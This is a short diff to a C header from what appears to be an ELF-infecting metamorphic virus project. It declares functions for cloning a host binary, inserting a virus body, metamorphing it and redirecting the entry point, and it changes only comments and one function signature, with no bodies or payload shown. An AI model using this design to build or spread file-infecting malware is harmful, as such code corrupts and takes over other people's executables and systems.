@@ -26,8 +26,8 @@
 
 struct entry
 {
-	struct elf64_phdr	*safe_phdr;     // program header to adjust (exec or data)
-	struct elf64_shdr	*safe_shdr;     // section header to adjust (last section or bss)
+	struct elf64_phdr	*safe_phdr;     // program header to adjust
+	struct elf64_shdr	*safe_shdr;     // section header to adjust
 	size_t			entry_offset;   // entry point offset in file
 	size_t			entry_addr;     // entry point virtual address
 	size_t			payload_offset; // payload offset in file
@@ -52,7 +52,7 @@ bool		find_entry(struct entry *entry, struct safe_ptr ref, size_t full_virus_siz
 bool		adjust_references(struct safe_ptr clone_ref, size_t shift_amount, size_t end_of_last_section);
 bool		setup_virus_header(struct safe_ptr clone_ref, size_t end_of_last_section, struct virus_header vhdr);
 bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t end_of_last_section, size_t shift_amount);
-bool		copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *file_entry, const struct virus_header *vhdr);
+bool		copy_virus_to_clone(struct safe_ptr clone_ref, size_t payload_offset, const struct virus_header *vhdr);
 bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_offset, size_t *full_virus_size, const struct virus_header *vhdr);
 bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref);
 bool		change_entry(struct safe_ptr clone_ref, const struct entry *file_entry, size_t dist_jmpclient_loader);
